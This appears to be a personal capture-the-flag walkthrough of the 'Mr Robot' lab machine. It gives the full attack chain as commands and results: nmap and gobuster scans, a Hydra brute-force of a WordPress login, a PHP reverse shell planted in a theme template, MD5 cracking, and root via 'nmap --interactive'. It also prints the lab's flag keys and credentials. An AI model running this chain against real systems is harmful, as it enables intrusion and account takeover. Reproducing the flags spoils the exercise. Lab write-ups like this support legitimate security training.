# Mr Robot Notes

# My IP = 10.8.19.163

# Target IP = c

# NMAP Scan:

> nmap -Pn -n -sC -sV -vv -T4 -A --script vuln 10.10.188.0 | tee mr-robot.nmap

Results: 

80/tcp  open   http     syn-ack ttl 63 Apache httpd
443/tcp open   ssl/http syn-ack ttl 63 Apache httpd

# Gobuster

> gobuster dir -u http://10.10.188.0:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee mrrobotbuster.txt

Results:

/images (Status: 301)
/blog (Status: 301)
/rss (Status: 200)
/sitemap (Status: 200)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 200)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 200)
/wp-content (Status: 301) - blog logon page. 
/admin (Status: 301)
/audio (Status: 301)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 200)
/intro (Status: 200)
/license (Status: 200) - had a flag or potential password on the document. 
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 200)
/page1 (Status: 200)
/readme (Status: 200) - 

/robots (Status: 200) - Stored first key. "073403c8a58a1f80d943455fb30724b9" - also downloaded the fscoity.dec file.

[ERROR] 2020/05/26 16:14:26 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
/dashboard (Status: 302)
/%20 (Status: 301)

1. Whats the first key?

> 073403c8a58a1f80d943455fb30724b9

2. What is the second key?

#Hydra

1. Used the dictionary files downloaded and attacking the http post form with hydra:

> hydra -l /home/cory/DirFusion/mr\ robot/fsocity.dic -p /home/cory/DirFusion/mr\ robot/fsocity.dic -u 10.10.188.0 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.188.0%2Fwp-admin%2F&testcookie=1:Login Failed" -vv

Trying peoples names wordlist for the user name and the fscoity.dic file. 

!!!Problem. Hydra would successfully crack the password but because I had the login flags with lower case it was reading my file path as the password and user name. SOOOOO I switched both to the uper case "-L & -P". Working jsut fine now.

2. Decided to try and use all the iterations of the username "Elliot" that is in our fsocity list. Username is "Elliot". This shortened the password cracking by alot. I did this by plugging in the username in the forget my password page of the web application. Elliot is the only one that did not return an error.

# Base64 

The password information that was given on the "license" page was base64 encoded. I cancelled the hydra password crack and decided to try the username and password after decoding the base64 information.

Username: elliot 	Password: ER28-0652

# Reverse Shell time

1. Edited Pentest Monkey's PHP reverse shell. Added my VPN tun0 IP address and port 7777.

2. Edited existing template and saved the data. Ran the code by accessing the new directory via the browser. Go to ---> Appearance, Editor. Select template to edit. I chose the 404.php template and pasted the revshell.php code. Success I have a reverse shell. 

# Im in!

> $ uname -a
> Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

1. Found md5 hash for user robot.

> robot:c3fcd3d76192e4007dfb496cca67e13b

# John

> john --format=RAW-md5 --fork=4 -wordlist=/usr/share/wordlists/rockyou.txt robot.txt

Success? Password: abcdefghijklmnopqrstuvwxyz

# Privilege Escalation

1. I need to switch to the user "robot".

> python -c 'import pty; pty.spawn("/bin/bash")'

> su robot

Enter password cracked by John.

> cd /home/robot

> cat key-2-of-3.txt

> 822c73956184f694993bede3eb39f959

2. Get root shell.

> nmap --interactive

> !sh

Now I have a root shell. 

> cd /root

> cat key-3-of-3.txt

> 04787ddef27c3dee1ee161b21670b4e4





